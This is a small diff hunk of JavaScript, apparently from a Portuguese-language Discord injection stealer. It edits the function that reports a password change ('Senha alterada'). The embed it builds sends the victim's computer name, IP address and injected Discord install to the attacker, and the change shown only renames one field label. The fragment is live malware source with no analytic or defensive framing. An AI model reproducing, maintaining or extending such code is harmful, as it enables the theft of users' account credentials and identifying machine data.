@@ -140,7 +140,7 @@ function ChangePassword(e, t, n) {
                         title: "Senha alterada",
                         color: 0000000,
                         fields: [{
-                            name: "PC",
+                            name: "Info's",
                             value: `\`\`\`NomePC: ${computerName}\nIP: ${s}\nInjetado Em: ${discordInstall}\n\`\`\``,
                             inline: !1
                         }, {
